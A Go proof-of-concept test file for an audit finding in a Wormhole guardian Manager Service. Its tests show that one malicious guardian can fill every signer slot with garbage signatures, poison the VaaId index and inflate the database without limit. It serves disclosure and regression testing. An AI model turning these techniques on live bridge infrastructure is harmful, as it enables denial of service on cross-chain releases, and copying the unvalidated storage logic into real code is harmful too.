// Proof-of-concept for the Manager Service signature-aggregation / DB poisoning
// finding (see audits/critical-research/FINDING-manager-service-dos.md).
//
// These tests drive the REAL ManagerService.storeSignature path (with an
// in-memory ManagerDB and a pre-populated ManagerSetReader cache, so no RPC is
// needed) to demonstrate that:
//
//   1. SignerIndex is not bound to the sender + first-write-wins ⇒ a single
//      guardian can fill every signer slot with garbage and drive the
//      aggregated transaction to "complete" with zero valid signatures.
//   2. A later honest signature for a poisoned slot is silently dropped.
//   3. VaaId is unvalidated and used as a DB index key ⇒ a real VaaId submitted
//      with a bogus VaaHash redirects GetPendingTransactionByID to attacker data.
//   4. VaaHash is unvalidated ⇒ arbitrary hashes create unbounded DB entries.
//
// None of this moves funds (the destination-chain multisig rejects the invalid
// signatures) — the impact is a persistent liveness DoS on UTXO/XRPL releases.
package manager

import (
	"context"
	"encoding/hex"
	"testing"

	"github.com/certusone/wormhole/node/pkg/db"
	"github.com/dgraph-io/badger/v3"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/wormhole-foundation/wormhole/sdk/vaa"
	"go.uber.org/zap"
)

// newPoCService builds a ManagerService backed by an in-memory ManagerDB and a
// reader cache holding a single 2-of-3 Dogecoin manager set at index 0.
func newPoCService(t *testing.T) (*ManagerService, func()) {
	t.Helper()

	bdb, err := badger.Open(badger.DefaultOptions("").WithInMemory(true).WithLogger(nil))
	require.NoError(t, err)

	logger := zap.NewNop()
	dummyPubKey := make([]byte, 33)
	dummyPubKey[0] = 0x02

	reader := &ManagerSetReader{
		logger: logger,
		cache:  make(map[vaa.ChainID]map[uint32]*ManagerSetConfig),
	}
	reader.cache[vaa.ChainIDDogecoin] = map[uint32]*ManagerSetConfig{
		0: {Index: 0, M: 2, N: 3, PublicKeys: [][]byte{dummyPubKey, dummyPubKey, dummyPubKey}},
	}

	svc := &ManagerService{
		ctx:    context.Background(),
		logger: logger,
		db:     db.NewManagerDB(bdb),
		reader: reader,
	}
	return svc, func() { _ = bdb.Close() }
}

// garbageSig fabricates a ManagerSignature carrying junk InputSignatures for a
// chosen signer slot. In the real attack these arrive over gossip inside a
// SignedManagerTransaction whose envelope is signed by ONE malicious guardian;
// storeSignature never verifies the inner signatures nor that SignerIndex
// belongs to that guardian.
func garbageSig(vaaHash []byte, vaaID string, signerIndex uint8) *ManagerSignature {
	return &ManagerSignature{
		VAAHash:          vaaHash,
		VAAID:            vaaID,
		DestinationChain: vaa.ChainIDDogecoin,
		ManagerSetIndex:  0,
		SignerIndex:      signerIndex,
		InputSignatures:  [][]byte{[]byte("GARBAGE-NOT-A-REAL-SIGNATURE")},
	}
}

// TestPoC_SignerIndexSpoofingCompletesAggregationWithGarbage proves issues (1) and (2):
// one attacker identity fills every signer slot with junk, the 2-of-3 aggregation
// reports complete, and a subsequent honest signature is dropped.
func TestPoC_SignerIndexSpoofingCompletesAggregationWithGarbage(t *testing.T) {
	svc, cleanup := newPoCService(t)
	defer cleanup()

	vaaHash := make([]byte, 32) // any 32 bytes; never validated against a real VAA
	for i := range vaaHash {
		vaaHash[i] = 0xAB
	}
	const vaaID = "3/0000000000000000000000000000000000000000000000000000000000000000/7"

	// A single malicious guardian spoofs all three signer indices with garbage.
	for idx := uint8(0); idx < 3; idx++ {
		svc.storeSignature(garbageSig(vaaHash, vaaID, idx))
	}

	agg := svc.GetPendingTransactionByHash(hex.EncodeToString(vaaHash))
	require.NotNil(t, agg, "aggregated transaction should exist")

	// The 2-of-3 aggregation is "complete" — entirely from attacker garbage.
	assert.True(t, agg.IsComplete(), "aggregation reached required threshold with junk signatures")
	assert.Equal(t, uint8(2), agg.Required)
	assert.GreaterOrEqual(t, len(agg.Signatures), int(agg.Required))
	for idx, sigs := range agg.Signatures {
		require.Len(t, sigs, 1)
		assert.Equal(t, []byte("GARBAGE-NOT-A-REAL-SIGNATURE"), sigs[0],
			"slot %d holds attacker garbage, not a valid signature", idx)
	}

	// Issue (2): an honest guardian's REAL signature for an already-poisoned slot
	// is silently dropped (first-write-wins), so it can never displace the junk.
	honest := &ManagerSignature{
		VAAHash:          vaaHash,
		VAAID:            vaaID,
		DestinationChain: vaa.ChainIDDogecoin,
		ManagerSetIndex:  0,
		SignerIndex:      0,
		InputSignatures:  [][]byte{[]byte("HONEST-REAL-SIGNATURE")},
	}
	svc.storeSignature(honest)

	agg2 := svc.GetPendingTransactionByHash(hex.EncodeToString(vaaHash))
	require.NotNil(t, agg2)
	assert.Equal(t, []byte("GARBAGE-NOT-A-REAL-SIGNATURE"), agg2.Signatures[0][0],
		"honest signature was dropped; poisoned slot still holds garbage")
}

// TestPoC_IndexPoisoningRedirectsByVaaID proves issue (3): VaaId is attacker-controlled
// and unvalidated, so submitting a legitimate VaaId with a bogus VaaHash overwrites the
// VaaId→hash index and makes lookups by VaaId return attacker data.
func TestPoC_IndexPoisoningRedirectsByVaaID(t *testing.T) {
	svc, cleanup := newPoCService(t)
	defer cleanup()

	const victimVaaID = "3/00000000000000000000000000000000000000000000000000000000000000cc/42"

	// Legitimate aggregation for the victim VaaId at its real hash.
	realHash := make([]byte, 32)
	realHash[0] = 0x01
	svc.storeSignature(&ManagerSignature{
		VAAHash: realHash, VAAID: victimVaaID, DestinationChain: vaa.ChainIDDogecoin,
		ManagerSetIndex: 0, SignerIndex: 0, InputSignatures: [][]byte{[]byte("REAL")},
	})

	// Attacker reuses the SAME VaaId but with a DIFFERENT (bogus) hash.
	bogusHash := make([]byte, 32)
	bogusHash[0] = 0xFF
	svc.storeSignature(&ManagerSignature{
		VAAHash: bogusHash, VAAID: victimVaaID, DestinationChain: vaa.ChainIDDogecoin,
		ManagerSetIndex: 0, SignerIndex: 1, InputSignatures: [][]byte{[]byte("ATTACKER")},
	})

	// Lookup by the victim VaaId now resolves to the attacker's bogus-hash entry.
	got := svc.GetPendingTransactionByID(victimVaaID)
	require.NotNil(t, got)
	assert.Equal(t, bogusHash, got.VAAHash,
		"VaaId index was redirected to the attacker-controlled hash")
	assert.Equal(t, []byte("ATTACKER"), got.Signatures[1][0])
}

// TestPoC_UnvalidatedVaaHashCreatesEntries proves issue (4): arbitrary VaaHash values
// (never checked against a real VAA) each create a distinct DB entry — an unbounded
// storage-growth primitive available to any guardian.
func TestPoC_UnvalidatedVaaHashCreatesEntries(t *testing.T) {
	svc, cleanup := newPoCService(t)
	defer cleanup()

	const n = 500
	for i := 0; i < n; i++ {
		h := make([]byte, 32)
		h[0] = byte(i)
		h[1] = byte(i >> 8)
		svc.storeSignature(garbageSig(h, "junk", 0))
	}

	all, err := svc.db.LoadAllAggregatedTransactions()
	require.NoError(t, err)
	assert.Equal(t, n, len(all),
		"every unvalidated VaaHash created its own aggregated-transaction entry")
}
